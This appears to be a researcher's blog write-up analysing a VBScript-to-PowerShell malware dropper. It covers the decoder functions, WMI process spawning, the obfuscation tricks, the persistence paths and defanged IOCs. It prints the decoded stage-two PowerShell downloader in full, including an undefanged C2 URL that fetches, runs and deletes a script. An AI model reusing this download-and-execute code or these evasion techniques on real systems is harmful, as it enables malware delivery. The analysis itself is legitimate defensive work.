---
layout: post
title: "Multi-Stage Dropper Analysis: VBScript to PowerShell"
date: 2026-02-01
categories: [ malware ]
permalink: /malware/vbscript-dropper-analysis/
tags: [malware-analysis, vbscript, powershell, obfuscation, cyberchef, homelab]
image: assets/images/malware/vbscript-dropper/05-decoded-wmi-dropper.png
---

Came across a multi-stage dropper that chains VBScript and PowerShell with several layers of obfuscation. The sample originated from an active campaign hosting content on `terazosine.fit`. Decided to work through the deobfuscation manually rather than just running it - wanted to understand the techniques being used.

## Sample Overview

- **Initial Vector:** HTML file with embedded VBScript
- **Stage 1:** Obfuscated VBScript using WMI for execution
- **Stage 2:** PowerShell dropper with persistence mechanisms
- **C2 Domain:** terazosine.fit

## Stage 1: VBScript Analysis

Opened the sample in Notepad++ and ran JSFormat to clean up the structure. The VBScript was heavily obfuscated - searched for common execution methods like `Execute`, `Eval`, `Run` but found nothing obvious. Searching for `GetObject` turned up WMI-based execution.

Found four custom decoder functions by searching for "Function":

![Decoder Functions](/assets/images/malware/vbscript-dropper/01-decoder-functions.png)

| Function | Purpose |
|----------|---------|
| `RWYGDTJTOHTCVIJCTKNJXY` | ASCII shift (subtract 1 from each character) |
| `LOOIMKHOROIYNCTVGPKNGC` | String reversal (XOR operations cancel out) |
| `PIBCVBCJVWQYLJMSLLGTXM` | Hex decode + XOR with key |
| `WBSWDTGSJCVPTRBKRAJRUO` | Array lookup for encoded payloads |

The ASCII shift function was straightforward - loops through each character, gets the ASCII value, subtracts 1, converts back to character:

![ASCII Shift Function](/assets/images/malware/vbscript-dropper/02-ascii-shift-function.png)

The encoded payloads were stored as hex-like strings in object properties. Noticed some invalid hex characters (`:` and `g`) mixed in - additional obfuscation layer that gets stripped during decoding:

![Encoded Payloads](/assets/images/malware/vbscript-dropper/04-encoded-payloads.png)

### Decoding in CyberChef

Traced through the decoder chain and built a CyberChef recipe. Had to work through it a few times - initially got garbage because I was applying the operations in encoding order instead of reversing them.

The XOR key itself was obfuscated. `EMTJSDDRKIFGIKQWNIMD` decoded to `DLSIRCCQJHEFHJPVMHLC` through the ASCII shift function:

![CyberChef XOR Key](/assets/images/malware/vbscript-dropper/03-cyberchef-xor-key.png)

Final working recipe:
1. Reverse
2. ADD -1 (Decimal)
3. Reverse
4. From Hex
5. XOR with decoded key

### Decoded Output

After running the encoded strings through the recipe, the WMI execution mechanism became clear:

![Decoded WMI and Dropper](/assets/images/malware/vbscript-dropper/05-decoded-wmi-dropper.png)

The VBScript uses WMI to spawn PowerShell:

```
winmgmts:{impersonationLevel=impersonate,authenticationLevel=pktPrivacy}!\
```

Key WMI components:
- `Win32_ProcessStartup` - Process creation class
- `Win32_Process` - Process execution
- `.ShowWindow = 0` - Hidden window
- `.Create()` - Spawns the payload

The `impersonationLevel=impersonate` and `authenticationLevel=pktPrivacy` flags indicate the author wanted elevated privileges and encrypted WMI traffic.

### Base64 Payload

The PowerShell command used `-ExecutionPolicy Bypass -EncodedCommand` followed by Base64. Decoding with UTF-16LE revealed the second stage downloader:

```powershell
$url='https://terazosine.fit/NKLZHRSXAPCIQHNBLSOV'
$NYXDDXXNNFIBJRBAQPTVZI = Join-Path ([System.IO.Path]::GetTempPath()) 'NYXDDXXNNFIBJRBAQPTVZI'
$JYQGBUBSINFEGPWOEVMKSU = Join-Path $NYXDDXXNNFIBJRBAQPTVZI 'TLGQKFDYDJZAQZHJDWCCVR.ps1'
$EKHBJJXVXCQPGVRMWEHRVZ = (iwr $url -UseBasicParsing).Content
New-Item -ItemType Directory -Path $NYXDDXXNNFIBJRBAQPTVZI -Force
$EKHBJJXVXCQPGVRMWEHRVZ | Out-File -FilePath $JYQGBUBSINFEGPWOEVMKSU
& $JYQGBUBSINFEGPWOEVMKSU
Remove-Item -Path $JYQGBUBSINFEGPWOEVMKSU -Force
Remove-Item -Path $NYXDDXXNNFIBJRBAQPTVZI -Force
```

Standard dropper behavior: download to temp, execute, cleanup.

## Stage 2: PowerShell Dropper

Fetched the second stage (178KB) and transferred it to the isolated FLARE VM for analysis. Different format than stage 1 - raw PowerShell with its own obfuscation techniques.

### Obfuscation Techniques

**1. Character Index Arrays**

Commands were built by indexing into scrambled character strings:

![PowerShell Index Decoding](/assets/images/malware/vbscript-dropper/06-powershell-index-decode.png)

```powershell
("OHbM8XB2e-cGYqyRtK1AUwJEufPL79mDsvTg6V1Sh0Crka4ZNnp3jWxiIozFd5Q")[34,8,32,16,9,26,45,16,40] -join ''
```

Ran these in PowerShell on the isolated VM - decoded to `Test-Path`, `New-Item`, `start-sleep`.

**2. ASCII Math**

Some characters built through arithmetic:

```powershell
[char](86 - 19)  # = [char](67) = 'C'
[char](117 - 59) # = [char](58) = ':'
```

**3. Substring Extraction from Decoy Strings**

This was the interesting one. Large blocks of security-themed text with intentional typos:

![Substring Obfuscation](/assets/images/malware/vbscript-dropper/08-substring-obfuscation.png)

```powershell
$YDTWTCAWMMHEIOF = "Hashing, a core concept in cryptography, is used to verify data integrity..."
$WVYFQANABLXCBEIHIWV = $YDTWTCAWMMHEIOF.Substring(86, 1)
```

The decoy strings contained intentional case variations (e.g., "Multi-faCtor") to provide specific characters at specific positions. Someone skimming the code might dismiss these as comments or legitimate functionality.

### Persistence Mechanism

The dropper creates multiple directories in `C:\ProgramData\` designed to blend with legitimate Microsoft paths:

![Persistence Paths](/assets/images/malware/vbscript-dropper/07-persistence-paths.png)

- `C:\ProgramData\OneAuth\Microsoft\PackagedEventProviders\DeliveryOptimization\...`
- `C:\ProgramData\PackageCache\Microsoft\INetCache\PackagedEventProviders\...`
- `C:\ProgramData\Local\MicrosoftWindows.Client\...`
- `C:\ProgramData\DeliveryCurrentControlSet\SessionManager\Optimization\...`

The flow:
1. Download decoy `Password.txt` from C2 and open it (user distraction)
2. Sleep 5 seconds
3. Check if persistence directories exist (`Test-Path`)
4. Create directories if missing (`New-Item`)
5. Prepare for payload drop

## IOCs

**URLs:**
- `hxxps://terazosine[.]fit/LAQVLANAMIKWWFMEZJVV` (Stage 1)
- `hxxps://terazosine[.]fit/NKLZHRSXAPCIQHNBLSOV` (Stage 2)
- `hxxps://terazosine[.]fit/VIFLAIEPJXVSSVDEWHXT` (Password.txt decoy)

**Persistence Paths:**
- `C:\ProgramData\OneAuth\Microsoft\PackagedEventProviders\`
- `C:\ProgramData\PackageCache\Microsoft\INetCache\`
- `C:\ProgramData\DeliveryCurrentControlSet\`

**MITRE ATT&CK:**
- T1059.001 - PowerShell
- T1059.005 - Visual Basic
- T1047 - Windows Management Instrumentation
- T1027 - Obfuscated Files or Information
- T1036.005 - Match Legitimate Name or Location

## Tooling

- CyberChef for VBScript deobfuscation
- PowerShell on isolated VM for decoding index arrays
- Notepad++ with syntax highlighting
- Isolated FLARE VM (192.168.100.110)

## Notes

The multi-layer obfuscation made static analysis tedious but not impossible. Each technique is well-known individually - the challenge is that chaining them together increases the time required to work through everything.

The decoy strings using security-themed text ("Hashing, a core concept in cryptography...") was a nice touch. The use of WMI with impersonation flags suggests the author had some thought put into privilege handling.

Would be interested to see what the final payload does once it establishes persistence, but the C2 domain was already down when I grabbed the samples.

---

*Analysis performed on isolated FLARE VM. IOCs defanged for safety.*
